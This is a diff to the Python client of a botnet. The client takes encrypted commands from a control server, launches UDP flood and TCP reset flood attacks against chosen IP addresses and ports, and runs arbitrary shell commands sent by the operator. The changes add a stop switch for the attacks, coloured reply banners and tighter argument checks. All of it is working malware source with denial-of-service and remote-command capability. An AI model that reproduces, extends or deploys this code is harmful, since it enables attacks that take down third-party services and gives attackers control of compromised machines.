@@ -2,28 +2,42 @@ import base64,socket,threading
 from Encryptor import AES_Encryption
 import socket,struct,threading,os
 
+banner = '\x1b[38;5;196mReply \x1b[38;5;197mfrom \x1b[38;5;198mKEY\x1b[38;5;255m=\x1b[38;5;198m%s \x1b[38;5;198mIV\x1b[38;5;255m=\x1b[38;5;198m%s\r\n%s\x1b[0m'
+
+stop = 0
+
 def TCP_RESET(s,size):
+  global stop
   try:
-   for _ in range(250):s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+   for _ in range(250):
+    if stop == 1:break
+    s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    s.shutdown(socket.SHUT_RDWR); s.close()
   except:pass
 
 def CNC(addr,size):
+  global stop
   try:
      for _ in range(250):
+      if stop == 1:break
       s = socket.create_connection(addr)
       threading.Thread(target=TCP_RESET,args=(s,size)).start()
   except Exception as e:print(e)
 
 def UDP_ATTACK(s,size,addr):
+    global stop
     try:
-        for _ in range(2500):[s.sendto(os.urandom(size),addr) for _ in range(15)]
+        for _ in range(2500):
+         if stop == 1:break
+         [s.sendto(os.urandom(size),addr) for _ in range(15)]
     except:
        pass
 
 def SOC(addr,size):
+  global stop
   try:
      for _ in range(250):
+      if stop == 1:break
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
   except:pass
@@ -108,30 +122,39 @@ def process_resp(s,resp,key):
  s.send(com[0])
 
 def command(s,command,key):
- global cache_response,cache_command
+ global cache_response,cache_command,banner,stop
  try:
+  print(base64.b64decode(command).decode())
   com = base64.b64decode(command).decode().split(' ')
-  print(com)
   if com[0].upper() == 'PING':threading.Thread(target=process_resp,args=(s,f'PONG',key)).start()
   elif com[0].upper() == 'CACHE_NOW':
-    s.send(cryptor(key[0],key[1],f'CACHE FROM KEY={key[0]} IV={key[1]}\r\nCACHE-RESPONSE={len(cache_response)}\r\n  {cache_response}\r\nCACHE-COMMAND={len(cache_command)}\r\n  {cache_command}',mode='enc'))
-  elif com[0].upper() == 'CACHE_CLEAR':cache_response.clear(); cache_command.clear(); threading.Thread(target=process_resp,args=(s,F'CACHE FROM KEY={key[0]} IV={key[1]}\r\n\r\nCOMMAND HAS BEEN CLEAR\r\nRESPONSE HAS BEEN CLEAR',key)).start()
+    s.send(cryptor(key[0],key[1],banner%s(key[0],key[1],f'CACHE-RESPONSE={len(cache_response)}\r\n  {cache_response}\r\nCACHE-COMMAND={len(cache_command)}\r\n  {cache_command}'),mode='enc'))
+  elif com[0].upper() == 'CACHE_CLEAR':cache_response.clear(); cache_command.clear(); threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m\r\nCOMMAND HAS BEEN CLEAR\r\nRESPONSE HAS BEEN CLEAR'),key)).start()
   elif com[0].upper() == 'SHELL':
    import subprocess
    result = subprocess.run(base64.b64decode(cryptor(key[0],key[1],com[1].encode(),'dec')).decode(), shell=True, capture_output=True, text=True)
-   if result.returncode == 0:threading.Thread(target=process_resp,args=(s,result.stdout,key)).start()
-   else:threading.Thread(target=process_resp,args=(s,result.stderr,key)).start()
+   if result.returncode == 0:threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m{result.stdout}'),key)).start()
+   else:threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m{result.stderr}'),key)).start()
   elif com[0].upper() in ['UDP-STORM','UDPSTORM','UDP_STORM']:
-    if len(com) > 5:
+    if len(com) == 5:
      ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
+     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
      [threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]
-    else:threading.Thread(target=process_resp,args=(s,'FAILED ATTACK UDP-STORM',key)).start()
-  elif com[0].upper() in ['TCP-RST','TCP-RESET']:
-    if len(com) > 5:
+    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
+  elif com[0].upper() in ['STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
+   if stop == 1:
+    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mCurrent running . . .'),key)).start()
+    stop = 0
+   else:
+    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196mCurrent stop . . .'),key)).start()
+    stop = 1
+  elif com[0].upper() in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET']:
+    if len(com) == 5:
      ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
+     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
      [threading.Thread(target=CNC,args=((ip,port),size)).start() for _ in range(thread)]
-    else:threading.Thread(target=process_resp,args=(s,'FAILED ATTACK TCP-RST',key)).start()
-  else:threading.Thread(target=process_resp,args=(s,f'FROM KEY={key[0]} IV={key[1]}\r\nNOT FOUND COMMAND',key)).start()
+    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
+  else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196mNot \x1b[38;5;197mFound \x1b[38;5;76m(\x1b[38;5;75m"\x1b[38;5;78m{com[0]}\x1b[38;5;75m"\x1b[38;5;76m)'),key)).start()
  except Exception as e:print(e)
 
 def botnet():
